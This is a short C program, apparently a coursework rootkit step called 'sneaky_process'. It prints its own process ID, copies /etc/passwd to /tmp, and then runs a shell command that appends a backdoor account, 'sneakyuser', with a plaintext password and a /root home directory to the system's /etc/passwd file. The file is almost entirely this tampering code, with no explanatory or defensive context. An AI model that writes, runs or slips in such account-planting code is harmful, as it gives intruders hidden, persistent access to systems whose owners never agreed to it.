#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

extern char **environ;
// Step 1: print its own process ID to the screen
void print_info() { printf("sneaky_process pid = %d\n", getpid()); }

// Step 2: insert a line to passwd file
void copy_file() {
  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
         "/etc/passwd");
}

int main() {
  print_info();
  copy_file();

  return EXIT_SUCCESS;
}